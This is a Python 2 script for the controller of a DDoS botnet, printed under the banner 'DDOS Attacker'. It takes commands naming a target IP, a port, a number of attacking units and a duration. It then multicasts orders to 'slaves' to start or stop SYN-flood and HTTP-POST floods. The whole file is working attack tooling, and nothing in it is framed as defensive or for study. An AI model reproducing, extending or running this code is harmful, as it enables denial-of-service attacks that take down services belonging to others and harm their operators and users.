import socket
from multicastsender import *

def readInputLine():
    line = raw_input("> ")
    line = line.lower()
    return line.split(' ')

def printHelp():
    print "Please inform <attack type> <flags>"
    print "\nValid attack types:"
    print "    syn-flood"
    print "    http-post"
    print "\n Compulsory flags to begin an attack:"
    print "    -port <[int] destination port>"
    print "    -ip <[ipv4] destination ip>"
    print "    -n <[int] number of attacking units>"
    print "\n Necessary flags:"
    print "    -start"
    print " or"
    print "    -stop"
    print "\n Flag:"
    print "    -time <[int] attack period in seconds>"
    print "\n Exit"
    print "    exit()"

def getArgs(words):
    iN = words.index('-n') + 1
    int(words[iN])

    iPort = words.index('-port') + 1
    int(words[iPort])

    iIP = words.index('-ip') + 1
    socket.inet_pton(socket.AF_INET, words[iIP])

    return words[iN] + ";" + words[iPort] + ";" +  words[iIP]

################################### MAIN ####################################### 
if __name__ == '__main__':
    sock = configMulticastSock()

    print "===== Welcome to DDOS Attacker====="
    print "Please command your attack or try --help for more information"

    try:
        while 1:
            words = readInputLine()
            if len(words[0]) == 0:
                continue

            if '--help' in words:
                printHelp()
                continue
            if 'exit()' in words:
                break

            if '-start' in words:
                try:
                    if 'syn-flood' in words:
                        body = 'syn-flood;start;'
                    elif 'http-post' in words:
                        body = 'http-post;start;'
                    else: 
                        print "Invalid command. Try --help for more information"
                        continue
                    body += getArgs(words)
                    if '-time' in words:
                        i = words.index('-time') + 1
                        int(words[i])
                        body += ";" + words[i]

                    sendMsgToSlaves(body, sock)
                except:
                    print "Invalid flag(s). Try --help for more information"
                    continue
            elif '-stop' in words:
                if 'syn-flood' in words:
                    body = 'syn-flood;stop'
                elif 'http-post' in words:
                    body = 'http-post;stop'
                else:
                    print "Invalid command. Try --help for more information"
                    continue
                sendMsgToSlaves(body, sock)
            else:
                print "Missing necessary flag. Try --help for more information"
    except KeyboardInterrupt:
        print "\nKeyboard interruption detected"

    print "Closing possible ongoing attacks..."
    sendMsgToSlaves("syn-flood;stop", sock)
    sendMsgToSlaves("http-post;stop", sock)

    sock.close()

